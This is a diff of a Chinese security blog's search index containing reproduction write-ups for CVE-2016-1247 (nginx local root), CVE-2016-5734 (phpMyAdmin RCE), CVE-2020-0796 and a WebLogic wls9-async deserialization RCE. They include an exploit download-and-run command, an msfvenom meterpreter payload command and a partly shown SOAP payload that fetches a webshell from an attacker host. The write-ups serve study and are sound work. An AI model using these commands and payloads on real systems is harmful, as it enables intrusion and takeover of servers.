-<p>​	2.在某些时候如果没有思路，对已有的信息再归纳归纳，或许有意想不到的收获，例如本次对注入点“优化”。</p>
-]]></content>
-      <categories>
-        <category>安全</category>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>SQLMAP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apereo CAS反序列化漏洞分析</title>
     <url>/archives/ab2213f4.html</url>
     <content><![CDATA[<p>在项目上遇到CAS，因此对CAS反序列化做一下复现及分析。</p>
@@ -1093,35 +1092,27 @@
       </tags>
   </entry>
   <entry>
-    <title>小米AX3600 TTL刷机</title>
-    <url>/archives/ed29cee2.html</url>
-    <content><![CDATA[<p>心血来潮把ax3600刷成openwrt 5.15内核，然后直接通过web界面（没清配置）降级到5.10，导致直接刷成砖。后面通过ttl成功救回来。</p>
-<p><img data-src="https://s2.loli.net/2022/03/28/zBLkYT5yaWqoZX3.png" alt="AX3600-黄灯"></p>
+    <title>CVE-2016-1247分析</title>
+    <url>/archives/eca7756b.html</url>
+    <content><![CDATA[<p>针对CVE-2016-1247漏洞进行复现、研究分析原理。<br><img data-src="https://i.loli.net/2018/05/27/5b0a99128c972.png" alt="success.png"></p>
 <span id="more"></span>
-
-<h1 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h1><p>把底部螺丝都拆下来之后，把卡扣翘起来就可以了。卡扣有点紧，要小心。</p>
-<p><img data-src="https://s2.loli.net/2022/03/28/NFwmTqpCt7abfYn.png" alt="AX3600-拆机"></p>
-<p>由于板子没有预留插座，需要自己焊一个插座上去。这时候就需要把天线、主板螺丝都卸下来。建议拍照，以免忘记如何布局。</p>
-<p><img data-src="https://s2.loli.net/2022/03/28/5HwyivaA6xqpDtM.png" alt="AX3600-主版"></p>
-<p>焊完插座，接上TTL就可以接着操作了。Ps：TTL接的时候需要RX-TX、TX—RX。</p>
-<p><img data-src="https://s2.loli.net/2022/03/28/JnAo2l1V6ObKXv5.png" alt="AX3600-TTL"></p>
-<h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>修改速率为115200，通过xshell、putty等任意工具连接</p>
-<p><img data-src="https://s2.loli.net/2022/03/28/Lh6XwAzR2uYflop.png" alt="AX3600-115200"></p>
-<p>Xshell连接之后，先不要接路由器，修改网卡速率为100M全双工，之后修改本地ip地址为192.168.31.100。最后接上网线（主机-路由器lan口）</p>
-<p><img data-src="https://s2.loli.net/2022/03/28/eKrY8AbqIxGaFhw.png" alt="AX3600-100m"></p>
-<p>现在重启路由器，等黄灯亮起来1s左右，接上杜邦线。Ps：如果先接上线，再重启路由器会导致路由器无法正常启动。</p>
-<p>由于AX3600是双分区，我刷机的时候是将openwrt刷到rootfs_1分区。为了避免问题，把rootfs、rootfs_1两个分区都擦除。TTL命令如下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv serverip 192.168.31.100</span><br><span class="line">setenv ipaddr 192.168.31.1</span><br><span class="line">tftpboot xx.ubi // 对应的ubi文件</span><br><span class="line">smeminfo  <span class="comment">#查看mtd12（roofs）和roofs1地址</span></span><br><span class="line"></span><br><span class="line">nand erase 0xa00000  0x23c0000 <span class="comment"># 擦除rootfs分区</span></span><br><span class="line">nand erase 0x2dc0000 0x8000000 <span class="comment">#擦除rootfs_1和后面所有数据</span></span><br><span class="line">nand write 0x44000000 0x2dc0000 0x1ac0000 <span class="comment">#将44000000数据写入2dc0000 写入数据大小为1ac0000 需根据ubi文件大小进行写入</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://s2.loli.net/2022/03/28/gFiynuozKwENRCJ.png" alt="AX3600-UBOOT"></p>
-<p>最后断电重启即可成功恢复，记得把ttl线拔下来。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP&#x2F;POP3&#x2F;SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。</p>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx&#x2F;web用户权限(www-data)提升到ROOT。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a99a92f715.png" alt="id.png"><br>查看Nginx版本<code>dpkg -l | grep -i nginx</code><br><img data-src="https://i.loli.net/2018/05/27/5b0a99c78ea14.png" alt="nginx version.png"><br>下载poc脚本</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>legalhackers.com<span class="regexp">/exploits/</span>CVE-<span class="number">2016</span>-<span class="number">1247</span>/nginxed-root.sh</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/05/27/5b0a9b092c3ec.png" alt="wget.png"><br>修改poc权限,并执行poc</p>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 nginxed-root.<span class="keyword">sh</span></span><br><span class="line">./nginxed-root.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/02/01/5a72bfed2d1c2.png" alt="run.png"><br>查看现在用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a9bb689f58.png" alt="final id.png"></p>
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行<br><img data-src="https://i.loli.net/2018/02/01/5a72c0782bbd3.png" alt="www-data.png"><br>查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的<br><img data-src="https://i.loli.net/2018/02/01/5a72c08966ad5.png" alt="root.png"><br>根据POC进行利用分析，在145行使用dlsym获取euid<br>在147、148行修改&#x2F;tmp&#x2F;nginxrootsh文件的所有者和权限<br>在149行删除&#x2F;etc&#x2F;ld.so.preload文件<br><img data-src="https://i.loli.net/2018/02/01/5a72c0a10d21f.png" alt="code.png"><br>在154行编译生成的c文件，在其后判断是否编译成功<br><img data-src="https://i.loli.net/2018/02/01/5a72c0b003134.png" alt="make.png"><br>在162行将&#x2F;bin&#x2F;bash拷贝到&#x2F;tmp&#x2F;nginxrootsh<br><img data-src="https://i.loli.net/2018/02/01/5a72c0c48ba68.png" alt="copy.png"><br>在172行删除nginx的错误日志文件并进行符号链接，将&#x2F;etc&#x2F;ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0d7d17c2.png" alt="delete.png"><br>在187行将&#x2F;etc&#x2F;ld.so.preload内容覆盖为&#x2F;tmp&#x2F;privesclib.so（加载&#x2F;tmp&#x2F;privesclib.so共享库）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0f12d27a.png" alt="copy.png"><br>在199行将&#x2F;etc&#x2F;ld.so.preload权限设置为755<br><img data-src="https://i.loli.net/2018/02/01/5a72c0ff840bc.png" alt="chmod.png"></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>root用户执行logrotate -f &#x2F;etc&#x2F;logrotate.d&#x2F;nginx，未获取到root权限情况下重启nginx服务并删除相关文件。<br><img data-src="https://i.loli.net/2018/05/27/5b0a9c0b508d9.png" alt="root command.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Nginx版本。</p>
 ]]></content>
       <categories>
-        <category>瞎折腾</category>
-        <category>IOT</category>
+        <category>安全</category>
+        <category>漏洞分析</category>
       </categories>
       <tags>
-        <tag>路由器</tag>
+        <tag>漏洞分析</tag>
       </tags>
   </entry>
   <entry>
@@ -1146,20 +1137,16 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2016-1247分析</title>
-    <url>/archives/eca7756b.html</url>
-    <content><![CDATA[<p>针对CVE-2016-1247漏洞进行复现、研究分析原理。<br><img data-src="https://i.loli.net/2018/05/27/5b0a99128c972.png" alt="success.png"></p>
+    <title>CVE-2016-5734分析</title>
+    <url>/archives/94f683da.html</url>
+    <content><![CDATA[<p>针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。<br><img data-src="https://i.loli.net/2018/05/28/5b0bad646bb23.png" alt="html.png"></p>
 <span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP&#x2F;POP3&#x2F;SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。</p>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx&#x2F;web用户权限(www-data)提升到ROOT。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a99a92f715.png" alt="id.png"><br>查看Nginx版本<code>dpkg -l | grep -i nginx</code><br><img data-src="https://i.loli.net/2018/05/27/5b0a99c78ea14.png" alt="nginx version.png"><br>下载poc脚本</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>legalhackers.com<span class="regexp">/exploits/</span>CVE-<span class="number">2016</span>-<span class="number">1247</span>/nginxed-root.sh</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/05/27/5b0a9b092c3ec.png" alt="wget.png"><br>修改poc权限,并执行poc</p>
-<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 nginxed-root.<span class="keyword">sh</span></span><br><span class="line">./nginxed-root.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/02/01/5a72bfed2d1c2.png" alt="run.png"><br>查看现在用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a9bb689f58.png" alt="final id.png"></p>
-<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行<br><img data-src="https://i.loli.net/2018/02/01/5a72c0782bbd3.png" alt="www-data.png"><br>查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的<br><img data-src="https://i.loli.net/2018/02/01/5a72c08966ad5.png" alt="root.png"><br>根据POC进行利用分析，在145行使用dlsym获取euid<br>在147、148行修改&#x2F;tmp&#x2F;nginxrootsh文件的所有者和权限<br>在149行删除&#x2F;etc&#x2F;ld.so.preload文件<br><img data-src="https://i.loli.net/2018/02/01/5a72c0a10d21f.png" alt="code.png"><br>在154行编译生成的c文件，在其后判断是否编译成功<br><img data-src="https://i.loli.net/2018/02/01/5a72c0b003134.png" alt="make.png"><br>在162行将&#x2F;bin&#x2F;bash拷贝到&#x2F;tmp&#x2F;nginxrootsh<br><img data-src="https://i.loli.net/2018/02/01/5a72c0c48ba68.png" alt="copy.png"><br>在172行删除nginx的错误日志文件并进行符号链接，将&#x2F;etc&#x2F;ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0d7d17c2.png" alt="delete.png"><br>在187行将&#x2F;etc&#x2F;ld.so.preload内容覆盖为&#x2F;tmp&#x2F;privesclib.so（加载&#x2F;tmp&#x2F;privesclib.so共享库）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0f12d27a.png" alt="copy.png"><br>在199行将&#x2F;etc&#x2F;ld.so.preload权限设置为755<br><img data-src="https://i.loli.net/2018/02/01/5a72c0ff840bc.png" alt="chmod.png"></p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>root用户执行logrotate -f &#x2F;etc&#x2F;logrotate.d&#x2F;nginx，未获取到root权限情况下重启nginx服务并删除相关文件。<br><img data-src="https://i.loli.net/2018/05/27/5b0a9c0b508d9.png" alt="root command.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Nginx版本。</p>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace &#x2F;触发的callback导致命令执行。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDAxODUv">下载<i class="fa fa-external-link-alt"></i></span>POC并执行即可。<br><img data-src="https://i.loli.net/2018/05/28/5b0bac6432b3e.png" alt="success.png"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。<br>跟进&#x2F;libraries&#x2F;controllers&#x2F;table&#x2F;TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上&#x2F;。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42577df.png" alt="1.png"><br>在661行getReplacePreview函数调用了getRegexReplaceRows。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426791f.png" alt="2.png"><br>在613行findAction函数调用了getReplacePreview。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4266236.png" alt="3.png"><br>在175行indexAction函数调用了findAction，当searchType为replace调用findAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4264c4b.png" alt="4.png"><br>在&#x2F;tbl_find_replace.php第33行调用indexAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42622fe.png" alt="5.png"><br>根据以上可得知，调用getRegexReplaceRows函数的流程为：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">/tbl_find_replace.ph →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php indexAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php findAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php getReplacePreview() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php _getRegexReplaceRows()</span><br></pre></td></tr></table></figure>
+<p>当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426366e.png" alt="6.png"><br>在&#x2F;libraries&#x2F;controllers&#x2F;TableController.php第20、25行分别定义了$db、$table。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4260f61.png" alt="7.png"><br>回溯Controller类，跟进&#x2F;libraries&#x2F;di&#x2F;Container.php，在51行定义get函数。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf425f9e6.png" alt="8.png"><br>当$find构造为0&#x2F;e0，preg_replace将$find变成&#x2F;0&#x2F;e0&#x2F;，在php5.5以下发生截断，变成preg_replace(&#x2F;0&#x2F;e, command,0&#x2F;e)。由此代码执行产生。</p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级phpMyAdmin。</p>
 ]]></content>
       <categories>
         <category>安全</category>
@@ -1218,26 +1205,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2016-5734分析</title>
-    <url>/archives/94f683da.html</url>
-    <content><![CDATA[<p>针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。<br><img data-src="https://i.loli.net/2018/05/28/5b0bad646bb23.png" alt="html.png"></p>
-<span id="more"></span>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace &#x2F;触发的callback导致命令执行。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDAxODUv">下载<i class="fa fa-external-link-alt"></i></span>POC并执行即可。<br><img data-src="https://i.loli.net/2018/05/28/5b0bac6432b3e.png" alt="success.png"></p>
-<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。<br>跟进&#x2F;libraries&#x2F;controllers&#x2F;table&#x2F;TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上&#x2F;。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42577df.png" alt="1.png"><br>在661行getReplacePreview函数调用了getRegexReplaceRows。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426791f.png" alt="2.png"><br>在613行findAction函数调用了getReplacePreview。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4266236.png" alt="3.png"><br>在175行indexAction函数调用了findAction，当searchType为replace调用findAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4264c4b.png" alt="4.png"><br>在&#x2F;tbl_find_replace.php第33行调用indexAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42622fe.png" alt="5.png"><br>根据以上可得知，调用getRegexReplaceRows函数的流程为：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">/tbl_find_replace.ph →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php indexAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php findAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php getReplacePreview() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php _getRegexReplaceRows()</span><br></pre></td></tr></table></figure>
-<p>当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426366e.png" alt="6.png"><br>在&#x2F;libraries&#x2F;controllers&#x2F;TableController.php第20、25行分别定义了$db、$table。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4260f61.png" alt="7.png"><br>回溯Controller类，跟进&#x2F;libraries&#x2F;di&#x2F;Container.php，在51行定义get函数。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf425f9e6.png" alt="8.png"><br>当$find构造为0&#x2F;e0，preg_replace将$find变成&#x2F;0&#x2F;e0&#x2F;，在php5.5以下发生截断，变成preg_replace(&#x2F;0&#x2F;e, command,0&#x2F;e)。由此代码执行产生。</p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级phpMyAdmin。</p>
-]]></content>
-      <categories>
-        <category>安全</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2016-8735分析</title>
     <url>/archives/c77f03de.html</url>
     <content><![CDATA[<p>针对CVE-2016-8735复现并分析。<br><img data-src="https://i.loli.net/2018/05/30/5b0e433658076.png" alt="success.png"></p>
@@ -1250,6 +1217,32 @@
 <li>升级Tomcat</li>
 <li>改变JMX密码认证</li>
 </ol>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2020-0796复现</title>
+    <url>/archives/852991fb.html</url>
+    <content><![CDATA[<p>看到GitHub上面有对应的exp，就复现看看。</p>
+<p><img data-src="https://s2.loli.net/2023/04/05/RFg1XrTl2G37EjK.png" alt="image-20200608145057355"></p>
+<span id="more"></span>
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>靶机地址</p>
+<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">ed2k://|<span class="string">file</span>|<span class="string">cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso</span>|<span class="string">5231140864</span>|<span class="string">B1D5C4C401036B0B1EBA64476A95F338</span>|<span class="string">/</span></span><br></pre></td></tr></table></figure>
+
+<p>使用msf生成对应payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b <span class="string">&#x27;\x00&#x27;</span> -i 1 -f python</span><br></pre></td></tr></table></figure>
+
+<p>使用python3运行脚本即可。</p>
+<p><img data-src="https://s2.loli.net/2023/04/05/RFg1XrTl2G37EjK.png" alt="image-20200608145057355"></p>
+<p>msf配置</p>
+<p><img data-src="https://s2.loli.net/2023/04/05/nLHhTSJEQmaY2q7.png"></p>
 ]]></content>
       <categories>
         <category>安全</category>
@@ -1279,22 +1272,56 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-0796复现</title>
-    <url>/archives/852991fb.html</url>
-    <content><![CDATA[<p>看到GitHub上面有对应的exp，就复现看看。</p>
-<p><img data-src="https://s2.loli.net/2023/04/05/RFg1XrTl2G37EjK.png" alt="image-20200608145057355"></p>
+    <title>weblogic wls9-async rce复现&amp;分析</title>
+    <url>/archives/94f70d04.html</url>
+    <content><![CDATA[<p>针对Weblogic wls9-async反序列化进行漏洞环境搭建及复现。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
 <span id="more"></span>
 
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>靶机地址</p>
-<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">ed2k://|<span class="string">file</span>|<span class="string">cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso</span>|<span class="string">5231140864</span>|<span class="string">B1D5C4C401036B0B1EBA64476A95F338</span>|<span class="string">/</span></span><br></pre></td></tr></table></figure>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>服务器需要安装jdk,这里采用1.7版本。</p>
+<p>在<span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9taWRkbGV3YXJlL3dlYmxvZ2ljL2Rvd25sb2Fkcy93bHMtbWFpbi0wOTcxMjcuaHRtbA==">Oracle官网<i class="fa fa-external-link-alt"></i></span>下载对应版本,这里使用的12.1.3(10.x版本也可以的)。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc10e75259ba.png"><img data-src="https://i.loli.net/2019/04/25/5cc10e75259ba.png" alt="oracle-download.png"></a></p>
+<p>下载完成之后，通过<code>java -jar fmw_12.1.3.0.0_wls.jar</code>启动安装程序，默认安装即可。安装完成之后启动weblogic。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc10f794723e.png"><img data-src="https://i.loli.net/2019/04/25/5cc10f794723e.png" alt="weblogic-start.png"></a></p>
+<p>通过浏览器访问查看服务是否启动。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc10fb8dade5.png"><img data-src="https://i.loli.net/2019/04/25/5cc10fb8dade5.png" alt="weblogic-bro.png"></a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在攻击机上通过python启动一个web服务，该目录下放一个webshell。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span> <span class="comment"># python2</span></span><br><span class="line">python3 -m http.server <span class="comment"># python3</span></span><br></pre></td></tr></table></figure>
 
-<p>使用msf生成对应payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b <span class="string">&#x27;\x00&#x27;</span> -i 1 -f python</span><br></pre></td></tr></table></figure>
+<p>由于是soap，先访问一下<span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvX2FzeW5jL0FzeW5jUmVzcG9uc2VTZXJ2aWNlP1dTREw=">http://ip:port/_async/AsyncResponseService?WSDL<i class="fa fa-external-link-alt"></i></span> ，看下格式结构。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc1105a91737.png"><img data-src="https://i.loli.net/2019/04/25/5cc1105a91737.png" alt="weblogic-wsdl.png"></a></p>
+<p>通过SOAP-UI进行请求构建，新建一个soap，在Initial WSDL输入刚刚的url。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc110c956692.png"><img data-src="https://i.loli.net/2019/04/25/5cc110c956692.png" alt="weblogic-soap.png"></a></p>
+<p>新建一个request请求。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc111862585f.png"><img data-src="https://i.loli.net/2019/04/25/5cc111862585f.png" alt="new-requests.png"></a></p>
+<p>将下列代码贴进请求包中，需要注意的是string标签下面的ip、port、webshell.txt这些需要按照自己的环境进行修改。我的攻击机ip为192.168.100.5 port为80 webshell.txt为cmd.txt。</p>
+<p>上传的路径：</p>
+<p>12版本<code>servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/</code></p>
+<p>10版本<code>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</code>。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span 